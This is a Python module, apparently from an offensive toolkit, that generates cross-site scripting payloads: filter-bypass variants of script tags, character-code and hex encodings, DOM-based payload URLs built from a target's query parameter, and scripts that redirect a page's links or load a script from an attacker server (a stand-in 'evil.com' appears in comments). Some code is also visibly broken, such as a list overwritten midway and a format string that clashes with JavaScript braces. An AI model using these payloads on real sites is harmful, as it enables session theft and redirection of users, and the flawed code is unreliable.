import codecs
import html
from .get_char_code import *
from .functions import *
from .classes import *

def xss_reflected_bypass(string):
    a = []
    all = []
    ############################################
    #A Method To Bypass Policy.
    a.append(string.replace("<script>","<<ScRipT>").replace("</script>","//<</sCrIPt>"))
    ############################################
    #Bypass Wthen (") Character Is Filtered.
    #Example:
    #<script>alert('test');</script>
    #And Bypass Like That:
    #<script>alert(String.fromCharCode(116 101 115 116));</script>
    a.append(from_char_code(string))
    ############################################
    #A Method To Bypass Policy.
    ans = '<IMG """>' + string + '">'
    ans = ans.lower().replace('<script>','<SCRIPT>')
    ans = ans.lower().replace('</script>','</SCRIPT>')
    a.append(ans)
    ############################################
    #A Method To Bypass Policy.
    a.append("<sCr" + string + "IpT>")
    ############################################
    #A Method To Bypass Policy.
    a.append(string.lower().replace("<script>","<ScR<script>Ipt>"))
    ############################################
    #Helps You To Bypass With Obfuscation.
    a.append("Obfuscate Your Code Here : http://dean.edwards.name/packer/")
    ############################################
    #A Method To Bypass Policy.
    a.append("\">" + string.replace("\"","\\").replace("\'","\\"))
    ############################################
    #A Method To Bypass Policy.
    last_str = string.replace("<script>","<script&param=>").replace("</script>","</&param=script>")
    a.append("You Should Replace 'param' With Target Variable :" + last_str)
    ############################################
    #Encode Symbols Of String To Hexadecimal
    a = xss()
    a.append(encode_symbol_hexadecimal(string))
    ############################################
    #Double Encode Symbols Of String To Hexadecimal
    a = xss()
    a.append(double_encode_symbol_hexadecimal(string))
    ############################################
    return a

#Enter Your Server Link Like That:
#http://evil.com
def xss_exploits(link):
    a = []
    ############################################
    #A Method That Change Link Of A Website To Your Evil Server.
    a.append("<script>window.onload = function() {var AllLinks=document.getElementsByTagName(\"a\");\
    AllLinks[0].href = \"{0}\"; }</script> ".format(link))
    ############################################
    #A Method To Bypass Policy.
    a.append("<SCRIPT%20a=\">\"%20SRC=\"{0}\"></SCRIPT>".format(link))
    ############################################
    return a

#Enter Taget With This Syntax:
#http://vulnerable.com/vul.html?default=something
#Important To Get Target Site Until '='
#Enter String Like That:
#<script>Your Code</script>
def xss_dom_bypass(target,exploit_string):
    a = []
    ############################################
    # Variables
    #Get The Key Of Vulnerable Site.
    #For Example Get 'name' In This Case:
    #http://vulnerable.com/vul.html?name=something
    key = target.split("?")[-1].split("=")[0]
    #Get The Target Url
    url = target.split("?")[0]
    ############################################
    #A Method That Just Add # To The First Of Exploit String.
    a.append(target + "#" + exploit_string)
    ############################################
    #A Mathod To Bypass Policy
    ready_string = url + "?payload=" + key + "=" + exploit_string + "&" + key + "=something"
    a.append(ready_string)
    ############################################
    return a
